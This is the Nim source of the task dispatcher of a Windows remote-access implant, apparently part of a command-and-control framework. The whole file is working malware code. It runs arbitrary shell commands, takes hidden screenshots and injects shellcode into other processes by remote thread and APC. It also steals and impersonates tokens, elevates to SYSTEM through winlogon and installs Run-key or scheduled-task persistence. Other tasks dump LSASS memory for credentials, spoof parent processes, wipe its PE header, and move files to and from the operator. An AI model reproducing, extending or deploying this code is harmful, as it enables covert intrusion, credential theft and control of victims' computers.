## Command dispatcher for Nim agent.
import winim/lean, winim/inc/tlhelp32
import std/[os, osproc, strutils, strformat, json, random, base64]
import config, transport, evasion

var sleepSecDyn* = SleepSec
var jitterDyn*   = JitterPct

proc currentSleepMs*(): int =
  let base  = float(sleepSecDyn) * 1000.0
  let jit   = base * float(jitterDyn) / 100.0
  let delta = (rand(1.0) * 2.0 - 1.0) * jit
  return max(1000, int(base + delta))

proc runShell*(cmd: string): string =
  try:
    let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
    return output
  except: return "[error: " & getCurrentExceptionMsg() & "]"

proc getEnvCmd(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  return $buf

proc extractFilename(path: string): string =
  let s = path.replace('\\', '/')
  let i = s.rfind('/')
  if i < 0: return s
  return s[i+1..^1]

# ─────────────────────────────────────────────────────────────────────────────
# Extended capabilities: injection, tokens, registry, persistence, recon
# ─────────────────────────────────────────────────────────────────────────────

const THREAD_SET_CONTEXT_FLAG: DWORD = 0x0010

# ── Screenshot (PowerShell GDI) ───────────────────────────────────────────────
proc doScreenshot(): seq[byte] =
  let ps = "Add-Type -Assembly System.Windows.Forms,System.Drawing;" &
    "$b=[Drawing.Bitmap]::new([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width," &
    "[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);" &
    "$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);" &
    "$ms=[IO.MemoryStream]::new();$b.Save($ms,'Png');" &
    "[Convert]::ToBase64String($ms.ToArray())"
  let (outp, code) = execCmdEx("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
  if code != 0: return @[]
  try: return cast[seq[byte]](decode(outp.strip()))
  except: return @[]

# ── Remote thread injection ───────────────────────────────────────────────────
proc doInjectRemote(pid: int; sc: seq[byte]): string =
  let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
  var written: SIZE_T
  discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
  var old: DWORD
  discard VirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
  var tid: DWORD
  let ht = CreateRemoteThread(hProc, nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, addr tid)
  if ht == 0: return "CreateRemoteThread failed (err " & $GetLastError() & ")"
  discard CloseHandle(ht)
  return "[+] injected " & $sc.len & " bytes into PID " & $pid & " (TID=" & $tid & ")"

# ── APC queue injection ───────────────────────────────────────────────────────
proc doInjectAPC(pid: int; sc: seq[byte]): string =
  let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
  var written: SIZE_T
  discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
  if snap == INVALID_HANDLE_VALUE: return "snapshot failed"
  defer: discard CloseHandle(snap)
  var te: THREADENTRY32
  te.dwSize = DWORD(sizeof(te))
  var queued = 0
  if Thread32First(snap, addr te).bool:
    while true:
      if te.th32OwnerProcessID == DWORD(pid):
        let ht = OpenThread(THREAD_SET_CONTEXT_FLAG, WINBOOL(0), te.th32ThreadID)
        if ht != 0:
          discard QueueUserAPC(cast[PAPCFUNC](mem), ht, 0)
          discard CloseHandle(ht)
          inc queued
      if not Thread32Next(snap, addr te).bool: break
  return "[+] APC queued to " & $queued & " thread(s) in PID " & $pid

# ── Privilege helper ──────────────────────────────────────────────────────────
proc enablePriv(hToken: HANDLE; privName: string): bool =
  var luid: LUID
  if LookupPrivilegeValueW(nil, newWideCString(privName), addr luid) == 0: return false
  var tp: TOKEN_PRIVILEGES
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  return AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(tp)), nil, nil).bool

# ── Token steal ───────────────────────────────────────────────────────────────
proc doTokenSteal(pid: int): string =
  var hSelf: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
    discard enablePriv(hSelf, "SeDebugPrivilege")
    discard CloseHandle(hSelf)
  let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  var hTok: HANDLE
  if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
    return "OpenProcessToken failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hTok)
  var hDup: HANDLE
  discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
    securityImpersonation, tokenImpersonation, addr hDup)
  if hDup == 0: return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
  if ImpersonateLoggedOnUser(hDup) == 0:
    discard CloseHandle(hDup)
    return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
  discard CloseHandle(hDup)
  return "[+] impersonating token from PID " & $pid

# ── Logon-based token ─────────────────────────────────────────────────────────
proc doTokenMake(user, domain, pass: string): string =
  var hTok: HANDLE
  if LogonUserW(newWideCString(user), newWideCString(domain), newWideCString(pass),
      LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, addr hTok) == 0:
    return "LogonUser failed (err " & $GetLastError() & ")"
  if ImpersonateLoggedOnUser(hTok) == 0:
    discard CloseHandle(hTok)
    return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
  discard CloseHandle(hTok)
  return "[+] impersonating " & domain & "\\" & user

# ── Token drop / whoami ───────────────────────────────────────────────────────
proc doTokenDrop(): string =
  discard RevertToSelf()
  return "[+] reverted to original token"

proc doTokenWhoami(): string =
  var buf: array[512, WCHAR]
  var sz = DWORD(buf.len)
  if GetUserNameW(addr buf[0], addr sz) == 0: return "GetUserNameW failed"
  return $cast[WideCString](addr buf[0])

# ── SYSTEM elevation via winlogon token ──────────────────────────────────────
proc doGetSystem(): string =
  var hSelf: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
    discard enablePriv(hSelf, "SeDebugPrivilege")
    discard CloseHandle(hSelf)
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return "CreateToolhelp32Snapshot failed"
  defer: discard CloseHandle(snap)
  var pe: PROCESSENTRY32W
  pe.dwSize = DWORD(sizeof(pe))
  var sysPid: DWORD = 0
  if Process32FirstW(snap, addr pe).bool:
    while true:
      if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "winlogon.exe":
        sysPid = pe.th32ProcessID; break
      if not Process32NextW(snap, addr pe).bool: break
  if sysPid == 0: return "winlogon.exe not found"
  let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
  if hProc == 0: return "OpenProcess(winlogon) failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  var hTok: HANDLE
  if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0:
    return "OpenProcessToken(winlogon) failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hTok)
  var hDup: HANDLE
  discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
    securityImpersonation, tokenImpersonation, addr hDup)
  if hDup == 0: return "DuplicateTokenEx failed"
  if ImpersonateLoggedOnUser(hDup) == 0:
    discard CloseHandle(hDup)
    return "ImpersonateLoggedOnUser failed"
  discard CloseHandle(hDup)
  return "[+] SYSTEM token impersonated (winlogon PID=" & $sysPid & ")"

# ── Persistence ───────────────────────────────────────────────────────────────
proc doPersist(name, cmd, meth: string): string =
  if meth == "schtask":
    return runShell("schtasks /create /tn \"" & name & "\" /tr \"" & cmd &
      "\" /sc ONLOGON /ru SYSTEM /f 2>&1")
  return runShell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
    name & "\" /t REG_SZ /d \"" & cmd & "\" /f 2>&1")

proc doPersistRm(name, meth: string): string =
  if meth == "schtask":
    return runShell("schtasks /delete /tn \"" & name & "\" /f 2>&1")
  return runShell("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
    name & "\" /f 2>&1")

# ── Port scan (PowerShell TcpClient) ─────────────────────────────────────────
proc doPortScan(host, ports: string; timeoutMs: int): string =
  let ps = "$h='" & host & "';$t=" & $timeoutMs & ";" &
    "'" & ports & "'.Split(',') | ForEach-Object { $p=[int]$_;" &
    "$s=New-Object System.Net.Sockets.TcpClient;" &
    "$a=$s.BeginConnect($h,$p,$null,$null);" &
    "if($a.AsyncWaitHandle.WaitOne($t)){if($s.Connected){'OPEN '+$h+':'+$p};$s.Close()} }"
  let (outp, _) = execCmdEx("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
  return if outp.strip() == "": "no open ports" else: outp

# ── LSASS minidump via comsvcs.dll ────────────────────────────────────────────
proc doMinidump(outPath: string): string =
  let ps = "$p=(Get-Process lsass).Id;" &
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '" & outPath & "' full"
  let res = runShell("powershell.exe -NoP -NonI -C \"" & ps & "\"")
  return if res.strip() == "": "[+] dump written to " & outPath else: res

# ─────────────────────────────────────────────────────────────────────────────

proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload: seq[byte]) =
  case typ.toUpperAscii()
  of "SHELL":
    t.sendResult(id, runShell(args), "")
  of "SLEEP":
    let parts = args.split(' ')
    if parts.len >= 1:
      try: sleepSecDyn = parseInt(parts[0]) except: discard
    if parts.len >= 2:
      try: jitterDyn = parseInt(parts[1]) except: discard
    t.sendResult(id, "[+] sleep updated", "")
  of "SYSINFO":
    let info = "hostname=" & getEnvCmd("COMPUTERNAME","?") &
      "\nusername=" & getEnvCmd("USERNAME","?") &
      "\nos=windows/amd64\npid=" & $GetCurrentProcessId()
    t.sendResult(id, info, "")
  of "PS":
    t.sendResult(id, runShell("tasklist /FO CSV /NH 2>&1"), "")
  of "PWD":
    t.sendResult(id, getCurrentDir(), "")
  of "CD":
    try: setCurrentDir(args); t.sendResult(id, getCurrentDir(), "")
    except: t.sendResult(id, "", "cd: " & getCurrentExceptionMsg())
  of "LS":
    var lsOut = ""
    let dir = if args == "": getCurrentDir() else: args
    try:
      for kind, path in walkDir(dir):
        let k = case kind
          of pcFile: "F"
          of pcDir: "D"
          else: "?"
        lsOut.add(k & "  " & path & "\n")
    except: lsOut = "[error listing]"
    t.sendResult(id, lsOut, "")
  of "CAT":
    try: t.sendResult(id, readFile(args), "")
    except: t.sendResult(id, "", "cat: " & getCurrentExceptionMsg())
  of "MKDIR":
    try: createDir(args); t.sendResult(id, "[+] created", "")
    except: t.sendResult(id, "", "mkdir: " & getCurrentExceptionMsg())
  of "RM":
    try:
      if dirExists(args): removeDir(args)
      else: removeFile(args)
      t.sendResult(id, "[+] removed", "")
    except: t.sendResult(id, "", "rm: " & getCurrentExceptionMsg())
  of "ENV":
    t.sendResult(id, runShell("set 2>&1"), "")
  of "SCREENSHOT":
    let data = doScreenshot()
    if data.len == 0:
      t.sendResult(id, "", "screenshot failed")
    else:
      t.uploadFile(id, "screenshot.png", data)
      t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
  of "INJECT_REMOTE":
    if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "INJECT_REMOTE requires {\"pid\":N}"); return
      t.sendResult(id, doInjectRemote(pid, payload), "")
    except: t.sendResult(id, "", "inject_remote: " & getCurrentExceptionMsg())
  of "INJECT_APC":
    if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "INJECT_APC requires {\"pid\":N}"); return
      t.sendResult(id, doInjectAPC(pid, payload), "")
    except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
  of "TOKEN_STEAL":
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "TOKEN_STEAL requires {\"pid\":N}"); return
      t.sendResult(id, doTokenSteal(pid), "")
    except: t.sendResult(id, "", "token_steal: " & getCurrentExceptionMsg())
  of "TOKEN_MAKE":
    try:
      let j = parseJson(args)
      let user   = j{"user"}.getStr()
      let domain = j{"domain"}.getStr(".")
      let pass   = j{"pass"}.getStr()
      if user == "" or pass == "": t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
      t.sendResult(id, doTokenMake(user, domain, pass), "")
    except: t.sendResult(id, "", "token_make: " & getCurrentExceptionMsg())
  of "TOKEN_DROP":
    t.sendResult(id, doTokenDrop(), "")
  of "TOKEN_WHOAMI":
    t.sendResult(id, doTokenWhoami(), "")
  of "GETSYSTEM":
    t.sendResult(id, doGetSystem(), "")
  of "PERSIST":
    try:
      let j = parseJson(args)
      let name = j{"name"}.getStr("Updater")
      let cmd  = j{"cmd"}.getStr()
      let meth = j{"method"}.getStr("registry")
      if cmd == "": t.sendResult(id, "", "PERSIST requires cmd"); return
      t.sendResult(id, doPersist(name, cmd, meth), "")
    except: t.sendResult(id, "", "persist: " & getCurrentExceptionMsg())
  of "PERSIST_RM":
    try:
      let j = parseJson(args)
      let name = j{"name"}.getStr()
      let meth = j{"method"}.getStr("registry")
      if name == "": t.sendResult(id, "", "PERSIST_RM requires name"); return
      t.sendResult(id, doPersistRm(name, meth), "")
    except: t.sendResult(id, "", "persist_rm: " & getCurrentExceptionMsg())
  of "REG_QUERY":
    t.sendResult(id, runShell("reg query \"" & args & "\" 2>&1"), "")
  of "REG_LIST":
    t.sendResult(id, runShell("reg query \"" & args & "\" /s 2>&1"), "")
  of "REG_SET":
    try:
      let j = parseJson(args)
      let path = j{"path"}.getStr()
      let name = j{"name"}.getStr()
      let typ2 = j{"type"}.getStr("REG_SZ")
      let val  = j{"value"}.getStr()
      t.sendResult(id, runShell("reg add \"" & path & "\" /v \"" & name &
        "\" /t " & typ2 & " /d \"" & val & "\" /f 2>&1"), "")
    except: t.sendResult(id, "", "reg_set: " & getCurrentExceptionMsg())
  of "REG_DELETE":
    try:
      let j = parseJson(args)
      let path = j{"path"}.getStr()
      let name = j{"name"}.getStr()
      let cmd2 = if name != "":
        "reg delete \"" & path & "\" /v \"" & name & "\" /f 2>&1"
      else:
        "reg delete \"" & path & "\" /f 2>&1"
      t.sendResult(id, runShell(cmd2), "")
    except: t.sendResult(id, "", "reg_delete: " & getCurrentExceptionMsg())
  of "PORT_SCAN":
    try:
      let j = parseJson(args)
      let host    = j{"host"}.getStr("127.0.0.1")
      let ports   = j{"ports"}.getStr("80,443,445,3389,22,21,8080,8443")
      let timeout = j{"timeout"}.getInt(500)
      t.sendResult(id, doPortScan(host, ports, timeout), "")
    except: t.sendResult(id, "", "port_scan: " & getCurrentExceptionMsg())
  of "MINIDUMP":
    try:
      let outPath = parseJson(args){"path"}.getStr("C:\\Windows\\Temp\\1.dmp")
      t.sendResult(id, doMinidump(outPath), "")
    except: t.sendResult(id, "", "minidump: " & getCurrentExceptionMsg())
  of "HWBP_CLEAR":
    clearHWBP()
    t.sendResult(id, "[+] HWBP cleared", "")
  of "WIPE_MZ":
    wipeMZHeader()
    t.sendResult(id, "[+] MZ header wiped", "")
  of "PPID":
    try:
      let j = parseJson(args)
      let cmd    = j{"cmd"}.getStr("cmd.exe")
      let parent = j{"parent"}.getStr("explorer.exe")
      if spawnWithPPID(cmd, parent):
        t.sendResult(id, "[+] spawned with PPID=" & parent, "")
      else:
        t.sendResult(id, "", "ppid spoof failed — check permissions")
    except: t.sendResult(id, "", "ppid: " & getCurrentExceptionMsg())
  of "CONFIG":
    try:
      let j = parseJson(args)
      if j.hasKey("sleep_sec"):     sleepSecDyn     = j["sleep_sec"].getInt()
      if j.hasKey("jitter_pct"):    jitterDyn       = j["jitter_pct"].getInt()
      if j.hasKey("working_hours"): workingHoursDyn = j["working_hours"].getStr()
      t.sendResult(id, "[+] config updated", "")
    except: t.sendResult(id, "", "config: " & getCurrentExceptionMsg())
  of "KILL":
    t.sendResult(id, "bye", "")
    quit(0)
  of "UPLOAD":
    try:
      let j = parseJson(args)
      let remotePath = j["remote_path"].getStr()
      let data = t.downloadFile(j["filename"].getStr())
      if data.len == 0: t.sendResult(id, "", "download failed"); return
      writeFile(remotePath, cast[string](data))
      t.sendResult(id, "written " & $data.len & " bytes to " & remotePath, "")
    except: t.sendResult(id, "", getCurrentExceptionMsg())
  of "DOWNLOAD":
    try:
      let data = cast[seq[byte]](readFile(args))
      t.uploadFile(id, extractFilename(args), data)
      t.sendResult(id, "uploaded " & $data.len & " bytes", "")
    except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
  else:
    t.sendResult(id, "", "unknown task type: " & typ)
